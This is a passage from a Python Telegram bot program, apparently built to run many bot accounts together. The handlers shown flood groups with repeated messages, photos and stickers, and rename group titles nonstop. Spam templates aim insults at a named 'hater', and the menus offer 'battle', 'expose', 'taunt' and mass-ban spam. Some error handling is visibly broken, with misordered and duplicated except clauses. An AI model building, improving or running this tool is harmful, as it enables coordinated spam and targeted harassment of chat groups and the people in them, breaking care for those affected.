            "│  /battle <NAME>   ⤷ ⚔️ 𝐁𝐚𝐭𝐭𝐥𝐞 𝐒𝐩𝐚𝐦\n"
            "│  /expose <NAME>   ⤷ 📢 𝐄𝐱𝐩𝐨𝐬𝐞 𝐒𝐩𝐚𝐦\n"
            "│  /taunt <NAME>    ⤷ 😏 𝐓𝐚𝐮𝐧𝐭 𝐒𝐩𝐚𝐦\n"
            "│  /ko <NAME>       ⤷ 🥊 𝐊𝐎 𝐒𝐩𝐚𝐦\n"
            "│  /warcry          ⤷ 🔱 𝐖𝐚𝐫 𝐂𝐫𝐲 𝐒𝐩𝐚𝐦\n"
            "│  /fightback       ⤷ 😤 𝐅𝐢𝐠𝐡𝐭𝐛𝐚𝐜𝐤 𝐒𝐩𝐚𝐦\n"
            "│  /fspeed <SEC>    ⤷ ⚡ 𝐅𝐢𝐠𝐡𝐭 𝐒𝐩𝐞𝐞𝐝 𝐒𝐞𝐭\n"
            "│  /stopfight       ⤷ 🛑 𝐒𝐭𝐨𝐩 𝐀𝐥𝐥 𝐅𝐢𝐠𝐡𝐭\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "master": {
        "title": "🛑 𝐌𝐚𝐬𝐭𝐞𝐫",
        "text": (
            "╭━━━━〔 🛑 𝐌𝐀𝐒𝐓𝐄𝐑 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 〕━━━━╮\n"
            "│\n"
            "│  /stop  ⤷ 💀 𝐒𝐭𝐨𝐩 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠\n"
            "│  /akal  ⤷ ☠️ 𝐑𝐞𝐩𝐥𝐲 𝐇𝐚𝐭𝐞𝐫\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "powertools": {
        "title": "🔥 𝐏𝐨𝐰𝐞𝐫 𝐓𝐨𝐨𝐥𝐬",
        "text": (
            "╭━━━━〔 🔥 𝐏𝐎𝐖𝐄𝐑 𝐓𝐎𝐎𝐋𝐒 〕━━━━╮\n"
            "│\n"
            "│  /broadcast <MSG>  ⤷ 📡 𝐁𝐥𝐚𝐬𝐭 𝐀𝐥𝐥 𝐆𝐫𝐨𝐮𝐩𝐬\n"
            "│  /schedule <M> <MSG> ⤷ ⏰ 𝐃𝐞𝐥𝐚𝐲𝐞𝐝 𝐁𝐥𝐚𝐬𝐭\n"
            "│  /massban          ⤷ 🚫 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐀𝐥𝐥\n"
            "│  /tagall <MSG>     ⤷ 👥 𝐓𝐚𝐠 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬\n"
            "│  /purge <N>        ⤷ 🗑️ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐋𝐚𝐬𝐭 𝐍\n"
            "│  /exonc            ⤷ ⚡ 𝐄𝐱𝐨 𝐓𝐞𝐱𝐭 𝐁𝐨𝐦𝐛\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "modtools": {
        "title": "🛡️ 𝐌𝐨𝐝 𝐓𝐨𝐨𝐥𝐬",
        "text": (
            "╭━━━━〔 🛡️ 𝐌𝐎𝐃𝐄𝐑𝐀𝐓𝐈𝐎𝐍 〕━━━━╮\n"
            "│\n"
            "│  /warn             ⤷ ⚠️ 𝐖𝐚𝐫𝐧 𝐔𝐬𝐞𝐫\n"
            "│  /warns            ⤷ 📊 𝐒𝐞𝐞 𝐖𝐚𝐫𝐧𝐬\n"
            "│  /unwarn           ⤷ ✅ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐖𝐚𝐫𝐧\n"
            "│  /mute <MINS>      ⤷ 🔇 𝐌𝐮𝐭𝐞 𝐔𝐬𝐞𝐫\n"
            "│  /unmute           ⤷ 🔊 𝐔𝐧𝐦𝐮𝐭𝐞 𝐔𝐬𝐞𝐫\n"
            "│  /kick             ⤷ 👢 𝐊𝐢𝐜𝐤 𝐔𝐬𝐞𝐫\n"
            "│  /info             ⤷ 👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨\n"
            "│  /pin              ⤷ 📌 𝐏𝐢𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞\n"
            "│  /unpin            ⤷ 🗂️ 𝐔𝐧𝐩𝐢𝐧 𝐀𝐥𝐥\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "notes": {
        "title": "📝 𝐍𝐨𝐭𝐞𝐬",
        "text": (
            "╭━━━━〔 📝 𝐍𝐎𝐓𝐄𝐒 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━━╮\n"
            "│\n"
            "│  /note <KEY> <TEXT>  ⤷ 💾 𝐒𝐚𝐯𝐞 𝐍𝐨𝐭𝐞\n"
            "│  /getnote <KEY>      ⤷ 📖 𝐆𝐞𝐭 𝐍𝐨𝐭𝐞\n"
            "│  /notes              ⤷ 📋 𝐋𝐢𝐬𝐭 𝐀𝐥𝐥\n"
            "│  /delnote <KEY>      ⤷ 🗑️ 𝐃𝐞𝐥𝐞𝐭𝐞\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "groupsetup": {
        "title": "⚙️ 𝐆𝐫𝐨𝐮𝐩 𝐒𝐞𝐭𝐮𝐩",
        "text": (
            "╭━━━━〔 ⚙️ 𝐆𝐑𝐎𝐔𝐏 𝐒𝐄𝐓𝐔𝐏 〕━━━━╮\n"
            "│\n"
            "│  /setgc [TITLE]   ⤷ 👑 𝐆𝐢𝐯𝐞 𝐀𝐥𝐥 𝐁𝐨𝐭𝐬 𝐀𝐝𝐦𝐢𝐧\n"
            "│  /promote         ⤷ ⬆️ 𝐏𝐫𝐨𝐦𝐨𝐭𝐞 𝐔𝐬𝐞𝐫\n"
            "│  /demote          ⤷ ⬇️ 𝐃𝐞𝐦𝐨𝐭𝐞 𝐀𝐝𝐦𝐢𝐧\n"
            "│  /ban             ⤷ 🔨 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫\n"
            "│  /unban <ID>      ⤷ ✅ 𝐔𝐧𝐛𝐚𝐧\n"
            "│  /slide <ID>      ⤷ 🔥 𝐀𝐝𝐝 𝐒𝐥𝐢𝐝𝐞 𝐓𝐚𝐫𝐠𝐞𝐭\n"
            "│  /unslide <ID>    ⤷ ❌ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐒𝐥𝐢𝐝𝐞\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "autoguard": {
        "title": "🛡️ 𝐀𝐮𝐭𝐨 𝐆𝐮𝐚𝐫𝐝",
        "text": (
            "╭━━━━〔 🛡️ 𝐀𝐔𝐓𝐎 𝐆𝐔𝐀𝐑𝐃 〕━━━━╮\n"
            "│\n"
            "│  /antidelete on/off  ⤷ 🔴 𝐃𝐞𝐭𝐞𝐜𝐭 𝐃𝐞𝐥𝐞𝐭𝐞𝐝\n"
            "│  /watchspam on/off   ⤷ 👁️ 𝐅𝐥𝐨𝐨𝐝 𝐖𝐚𝐭𝐜𝐡𝐞𝐫\n"
            "│  /wsconfig <M> <S> <MIN> ⤷ ⚙️ 𝐂𝐨𝐧𝐟𝐢𝐠\n"
            "│  /addword <WORD>     ⤷ 🚫 𝐁𝐥𝐚𝐜𝐤𝐥𝐢𝐬𝐭 𝐖𝐨𝐫𝐝\n"
            "│  /delword <WORD>     ⤷ ✅ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐖𝐨𝐫𝐝\n"
            "│  /spamwords         ⤷ 📋 𝐋𝐢𝐬𝐭 𝐖𝐨𝐫𝐝𝐬\n"
            "│  /antilink on/off   ⤷ 🔗 𝐁𝐥𝐨𝐜𝐤 𝐋𝐢𝐧𝐤𝐬\n"
            "│  /antiforward on/off ⤷ 🔁 𝐁𝐥𝐨𝐜𝐤 𝐅𝐰𝐝\n"
            "│  /raidmode on/off   ⤷ ⚡ 𝐌𝐮𝐭𝐞 𝐀𝐥𝐥\n"
            "│  /lock / /unlock    ⤷ 🔒 𝐆𝐫𝐨𝐮𝐩 𝐋𝐨𝐜𝐤\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "advanced": {
        "title": "🚀 𝐀𝐝𝐯𝐚𝐧𝐜𝐞𝐝",
        "text": (
            "╭━━━━〔 🚀 𝐀𝐃𝐕𝐀𝐍𝐂𝐄𝐃 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 〕━━━━╮\n"
            "│\n"
            "│  /setwelcome <TEXT>  ⤷ 🎉 𝐂𝐮𝐬𝐭𝐨𝐦 𝐖𝐞𝐥𝐜𝐨𝐦𝐞\n"
            "│  /delwelcome         ⤷ ❌ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐖𝐞𝐥𝐜𝐨𝐦𝐞\n"
            "│  /gban               ⤷ 🌍 𝐆𝐥𝐨𝐛𝐚𝐥 𝐁𝐚𝐧\n"
            "│  /ungban <ID>        ⤷ ✅ 𝐆𝐥𝐨𝐛𝐚𝐥 𝐔𝐧𝐛𝐚𝐧\n"
            "│  /addtrigger <K> <R> ⤷ 💬 𝐀𝐮𝐭𝐨-𝐑𝐞𝐩𝐥𝐲\n"
            "│  /deltrigger <K>     ⤷ 🗑️ 𝐃𝐞𝐥 𝐓𝐫𝐢𝐠𝐠𝐞𝐫\n"
            "│  /triggers           ⤷ 📋 𝐋𝐢𝐬𝐭 𝐓𝐫𝐢𝐠𝐠𝐞𝐫𝐬\n"
            "│  /topchat            ⤷ 📊 𝐓𝐨𝐩 𝐂𝐡𝐚𝐭𝐭𝐞𝐫𝐬\n"
            "│  /report             ⤷ 📢 𝐑𝐞𝐩𝐨𝐫𝐭 𝐭𝐨 𝐀𝐝𝐦𝐢𝐧\n"
            "│  /autodelete <SECS>  ⤷ 🕐 𝐀𝐮𝐭𝐨-𝐃𝐞𝐥 𝐓𝐢𝐦𝐞𝐫\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
}

def _main_menu_keyboard():
    sections = [
        ("utilities",   "🛠️ 𝐔𝐭𝐢𝐥𝐢𝐭𝐢𝐞𝐬"),
        ("nc",          "⚡ 𝐍𝐜 𝐌𝐨𝐝𝐞"),
        ("emojinc",     "🎀 𝐄𝐦𝐨𝐣𝐢 𝐍𝐜"),
        ("gnc",         "🎨 𝐆𝐧𝐜 𝐆𝐞𝐧"),
        ("spam",        "😹 𝐒𝐩𝐚𝐦 𝐙𝐨𝐧𝐞"),
        ("target",      "🎯 𝐓𝐚𝐫𝐠𝐞𝐭"),
        ("swipereact",  "⚔️ 𝐒𝐰𝐢𝐩𝐞/𝐑𝐞𝐚𝐜𝐭"),
        ("fighting",    "⚔️ 𝐅𝐢𝐠𝐡𝐭𝐢𝐧𝐠"),
        ("botsettings", "🤖 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬"),
        ("tokens",      "🔑 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧𝐬"),
        ("global",      "🌐 𝐆𝐥𝐨𝐛𝐚𝐥"),
        ("admin",       "🔐 𝐀𝐝𝐦𝐢𝐧/𝐒𝐮𝐝𝐨"),
        ("slaves",      "⛓️ 𝐒𝐥𝐚𝐯𝐞𝐬"),
        ("layout",      "🎨 𝐋𝐚𝐲𝐨𝐮𝐭"),
        ("master",      "🛑 𝐌𝐚𝐬𝐭𝐞𝐫"),
        ("powertools",  "🔥 𝐏𝐨𝐰𝐞𝐫 𝐓𝐨𝐨𝐥𝐬"),
        ("modtools",    "🛡️ 𝐌𝐨𝐝 𝐓𝐨𝐨𝐥𝐬"),
        ("notes",       "📝 𝐍𝐨𝐭𝐞𝐬"),
        ("groupsetup",  "⚙️ 𝐆𝐫𝐨𝐮𝐩 𝐒𝐞𝐭𝐮𝐩"),
        ("autoguard",   "🛡️ 𝐀𝐮𝐭𝐨 𝐆𝐮𝐚𝐫𝐝"),
        ("advanced",    "🚀 𝐀𝐝𝐯𝐚𝐧𝐜𝐞𝐝"),
    ]
    keyboard = []
    for i in range(0, len(sections), 2):
        row = []
        for key, label in sections[i:i+2]:
            row.append(InlineKeyboardButton(label, callback_data=f"menu_{key}"))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("📊 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data="menu_status"),
                     InlineKeyboardButton("👑 𝐎𝐰𝐧𝐞𝐫", callback_data="menu_ownerinfo")])
    return InlineKeyboardMarkup(keyboard)

def _back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮", callback_data="menu_main")]])

# ─────────────────────────────────────────────────
#  START & HELP COMMANDS
# ─────────────────────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        MENU_WELCOME,
        reply_markup=_main_menu_keyboard()
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        MENU_WELCOME,
        reply_markup=_main_menu_keyboard()
    )

# ─────────────────────────────────────────────────
#  MENU CALLBACK HANDLER
# ─────────────────────────────────────────────────
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data  # e.g. "menu_nc", "menu_main"

    if data == "menu_main":
        await query.edit_message_text(MENU_WELCOME, reply_markup=_main_menu_keyboard())
        return

    if data == "menu_status":
        try:
            grp_count = len(json.load(open(GROUPS_FILE))) if os.path.exists(GROUPS_FILE) else 0
        except: grp_count = 0
        global_str = "🟢 ON" if global_mode else "🔴 OFF"
        text = (
            "╭━━━━〔 📊 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━━━╮\n"
            f"│\n"
            f"│  🤖 𝐁𝐨𝐭𝐬 𝐋𝐨𝐚𝐝𝐞𝐝 : {len(TOKENS)}\n"
            f"│  💬 𝐆𝐫𝐨𝐮𝐩𝐬      : {grp_count}\n"
            f"│  🌐 𝐆𝐥𝐨𝐛𝐚𝐥      : {global_str}\n"
            f"│  🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬    : {current_threads}/{MAX_THREADS}\n"
            f"│\n"
            f"│  🔄 𝐀𝐜𝐭𝐢𝐯𝐞 𝐓𝐚𝐬𝐤𝐬:\n"
            f"│  ├─ 𝐍𝐂     : {len(group_tasks)}\n"
            f"│  ├─ 𝐒𝐏𝐀𝐌   : {len(spam_tasks)}\n"
            f"│  ├─ 𝐒𝐖𝐈𝐏𝐄  : {len(swipe_tasks)}\n"
            f"│  ├─ 𝐑𝐄𝐀𝐂𝐓  : {len(react_mode)}\n"
            f"│  └─ 𝐃𝐑𝐄𝐀𝐂𝐓 : {len(dreact_mode)}\n"
            f"│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        await query.edit_message_text(text, reply_markup=_back_keyboard())
        return

    if data == "menu_ownerinfo":
        text = (
            "╭━━━━〔 👑 𝐎𝐖𝐍𝐄𝐑 〕━━━━╮\n"
            "│\n"
            "│  💀 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 💀\n"
            "│  @BLACKxGOD\n"
            "│\n"
            "│  𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 ~ 😍👑\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        await query.edit_message_text(text, reply_markup=_back_keyboard())
        return

    if data == "menu_tokens":
        extra_saved = load_extra_tokens()
        lines = []
        for i, t in enumerate(TOKENS, 1):
            uname = bot_usernames[i-1] if i-1 < len(bot_usernames) else "Unknown"
            masked = t[:8] + "***" + t[-4:]
            src = "💾 𝐒𝐚𝐯𝐞𝐝" if t in extra_saved else "🔒 𝐄𝐍𝐕"
            lines.append(f"│  {i}. @{uname}\n│     {masked} [{src}]")
        bots_text = "\n".join(lines) if lines else "│  ⚠️ 𝐊𝐨𝐢 𝐛𝐨𝐭 𝐧𝐚𝐡𝐢!"
        text = (
            "╭━━━━〔 🔑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 〕━━━━╮\n"
            "│\n"
            f"{bots_text}\n"
            "│\n"
            f"│  ✅ 𝐓𝐨𝐭𝐚𝐥 𝐀𝐜𝐭𝐢𝐯𝐞: {len(TOKENS)} 𝐁𝐨𝐭𝐬\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            "💡 𝐍𝐚𝐲𝐚 𝐛𝐨𝐭 𝐚𝐝𝐝 𝐤𝐚𝐫𝐧𝐞 𝐤𝐞 𝐥𝐢𝐲𝐞:\n"
            "👉 /addtoken <𝐁𝐨𝐭𝐅𝐚𝐭𝐡𝐞𝐫 𝐭𝐨𝐤𝐞𝐧>\n\n"
            "🗑️ 𝐁𝐨𝐭 𝐡𝐚𝐭𝐚𝐧𝐞 𝐤𝐞 𝐥𝐢𝐲𝐞:\n"
            "👉 /deltoken <𝐧𝐮𝐦𝐛𝐞𝐫>"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ 𝐍𝐚𝐲𝐚 𝐁𝐨𝐭 𝐀𝐝𝐝 𝐊𝐚𝐫𝐨", switch_inline_query_current_chat="/addtoken ")],
            [InlineKeyboardButton("🔄 𝐑𝐞𝐟𝐫𝐞𝐬𝐡 𝐋𝐢𝐬𝐭", callback_data="menu_tokens")],
            [InlineKeyboardButton("🔙 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮", callback_data="menu_main")],
        ])
        await query.edit_message_text(text, reply_markup=kb)
        return

    # Section menus
    section_key = data.replace("menu_", "")
    if section_key in MENU_SECTIONS:
        sec = MENU_SECTIONS[section_key]
        await query.edit_message_text(sec["text"], reply_markup=_back_keyboard())
        return

# ─────────────────────────────────────────────────
#  CORE LOOP FUNCTIONS
# ─────────────────────────────────────────────────
async def god_speed_loop(bot, chat_id, base_text):
    while True:
        try:
            ext = random.choice(EXONC_TEXTS + NCEMO_EMOJIS)
            await bot.set_chat_title(chat_id, f"{base_text} {ext}")
        except Exception:
            pass
            await asyncio.sleep(global_delay + 1)
        except asyncio.CancelledError: break
        except Exception as e:
            if "Too Many Requests" in str(e): await asyncio.sleep(10)
            else: await asyncio.sleep(2)

async def spam_loop(bot, chat_id, text):
    while True:
        try:
            await bot.send_message(chat_id, text)
            await asyncio.sleep(spam_delay)
        except asyncio.CancelledError: break
        except: await asyncio.sleep(2)

async def sequence_spam_loop(bot, cid, hater_name):
    idx = 0
    active_templates = [t for t in SPAM_TEMPLATE if t and t.strip()]
    if not active_templates: return
    while True:
        try:
            template = active_templates[idx % len(active_templates)]
            msg = template.replace("{hater}", hater_name).replace("{target}", hater_name)
            await bot.send_message(cid, msg)
            idx += 1
            await asyncio.sleep(spam_delay)
        except asyncio.CancelledError: break
        except: await asyncio.sleep(1)

# ─────────────────────────────────────────────────
#  NC COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def godspeed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    group_tasks[cid] = [asyncio.create_task(god_speed_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🔥 𝐆𝐎𝐃𝐒𝐏𝐄𝐄𝐃 𝐎𝐍!")

@only_sudo
async def stopnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
        del group_tasks[cid]
    await update.message.reply_text("🛑 𝐍𝐂 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@only_sudo
async def delaync_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_delay
    try:
        global_delay = float(context.args[0])
        await update.message.reply_text(f"⚡ 𝐍𝐂 𝐃𝐞𝐥𝐚𝐲: {global_delay}𝐬")
    except: await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delaync <seconds>")

@only_sudo
async def threads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_threads, global_delay
    try:
        val = int(context.args[0])
        if 1 <= val <= MAX_THREADS:
            current_threads = val
            await update.message.reply_text(f"✅ 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {current_threads}")
            if val > 300:
                global_delay = 0.5
                await update.message.reply_text("⚠️ 𝐒𝐚𝐟𝐞𝐭𝐲: 𝐃𝐞𝐥𝐚𝐲 → 0.5𝐬")
            elif val > 150:
                global_delay = 0.2
                await update.message.reply_text("⚠️ 𝐒𝐚𝐟𝐞𝐭𝐲: 𝐃𝐞𝐥𝐚𝐲 → 0.2𝐬")
        else:
            await update.message.reply_text(f"⚠️ 𝐑𝐚𝐧𝐠𝐞: 1–{MAX_THREADS}")
    except: await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /threads <number>")

# ─────────────────────────────────────────────────
#  EMOJI NC COMMANDS
# ─────────────────────────────────────────────────
def _make_emoji_nc(emoji_list, label):
    @only_sudo
    async def _cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
        base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
        if cid in group_tasks:
            for t in group_tasks[cid]: t.cancel()
        async def _loop(bot, c, b):
            while True:
                try:
                    emo = random.choice(emoji_list)
                    await bot.set_chat_title(c, f"{b} {emo}")
                    await asyncio.sleep(global_delay)
                except asyncio.CancelledError: break
                except Exception: await asyncio.sleep(1)
                except asyncio.CancelledError: break
                except: await asyncio.sleep(1)
        group_tasks[cid] = [asyncio.create_task(_loop(bot, cid, base)) for bot in bots]
        await update.message.reply_text(f"{emoji_list[0]} {label} 𝐎𝐍!")
    return _cmd

flagnc_cmd      = _make_emoji_nc(FLAGNC_EMOJIS,      "𝐅𝐋𝐀𝐆𝐍𝐂")
heartnc_cmd     = _make_emoji_nc(HEARTNC_EMOJIS,     "𝐇𝐄𝐀𝐑𝐓𝐍𝐂")
aestheticnc_cmd = _make_emoji_nc(AESTHETICNC_EMOJIS, "𝐀𝐄𝐒𝐓𝐇𝐄𝐓𝐈𝐂𝐍𝐂")
vegetablenc_cmd = _make_emoji_nc(VEGETABLENC_EMOJIS,  "𝐕𝐄𝐆𝐄𝐓𝐀𝐁𝐋𝐄𝐍𝐂")
animalnc_cmd    = _make_emoji_nc(ANIMALNC_EMOJIS,    "𝐀𝐍𝐈𝐌𝐀𝐋𝐍𝐂")

@only_sudo
async def timenc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args) if context.args else "Time", update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    async def time_loop(bot, c, b):
        while True:
            try:
                now = time.strftime("%S:%M:%H")
                await bot.set_chat_title(c, f"{b}╰┈➤{now}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(1)
    group_tasks[cid] = [asyncio.create_task(time_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("⏰ 𝐓𝐈𝐌𝐄𝐍𝐂 𝐎𝐍!")

@only_sudo
async def kengnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    async def keng_loop(bot, c, b):
        while True:
            try:
                e1, e2 = random.choice(EXONC_TEXTS), random.choice(NCEMO_EMOJIS)
                await bot.set_chat_title(c, f"{b} {e1}{e2}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(1)
    group_tasks[cid] = [asyncio.create_task(keng_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("✨ 𝐁𝐋𝐀𝐂𝐊𝐍𝐂 𝐎𝐍!")

# ─────────────────────────────────────────────────
#  SPAM COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def spam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text, cid = " ".join(context.args) if context.args else ALL_SPAM_TEXT, update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(spam_loop(bot, cid, text)) for bot in bots]
    await update.message.reply_text("💥 𝐒𝐏𝐀𝐌 𝐎𝐍!")

@only_sudo
async def unspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🛑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@only_sudo
async def imagespam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨.")
    cid = update.message.chat_id
    photo_id = update.message.reply_to_message.photo[-1].file_id
    async def image_spam_loop(bot, c, p):
        while True:
            try:
                await bot.send_photo(c, photo=p)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(2)
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(image_spam_loop(bot, cid, photo_id)) for bot in bots]
    await update.message.reply_text("📸 𝐈𝐌𝐀𝐆𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

@only_sudo
async def stickerspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.sticker:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫.")
    cid = update.message.chat_id
    sid = update.message.reply_to_message.sticker.file_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    async def sticker_loop(bot, c, s):
        while True:
            try:
                await bot.send_sticker(c, s)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    spam_tasks[cid] = [asyncio.create_task(sticker_loop(bot, cid, sid)) for bot in bots]
    await update.message.reply_text("🎭 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

@only_sudo
async def setmphoto_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐰𝐢𝐭𝐡 /setmphoto [𝐦𝐞𝐬𝐬𝐚𝐠𝐞]")
    cid = update.message.chat_id
    photo_id = update.message.reply_to_message.photo[-1].file_id
    caption = " ".join(context.args) if context.args else ""
    async def photo_msg_loop(bot, c, p, cap):
        while True:
            try:
                await bot.send_photo(c, photo=p, caption=cap if cap else None)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(2)
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(photo_msg_loop(bot, cid, photo_id, caption)) for bot in bots]
    await update.message.reply_text("📸✉️ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!" + (f"\n📝 {caption}" if caption else ""))

@only_sudo
async def clearmphoto_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🗑️ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐒𝐏𝐀𝐌 𝐂𝐋𝐄𝐀𝐑𝐄𝐃! ✅")

@only_sudo
async def delayspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global spam_delay
    try:
        spam_delay = float(context.args[0])
        await update.message.reply_text(f"💥 𝐒𝐩𝐚𝐦 𝐃𝐞𝐥𝐚𝐲: {spam_delay}𝐬")
    except: await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delayspam <seconds>")

# ─────────────────────────────────────────────────
#  TARGET COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def targetspm_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return
    target_names[update.message.chat_id] = " ".join(context.args)
    await update.message.reply_text(f"🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target_names[update.message.chat_id]}")

@only_sudo
async def settemplate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        idx, txt = int(context.args[0])-1, " ".join(context.args[1:])
        SPAM_TEMPLATE[idx] = txt
        await update.message.reply_text(f"✅ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 {idx+1} 𝐬𝐞𝐭.")
    except: await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /settemplate <id> <text>")

@only_sudo
async def showtemplate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
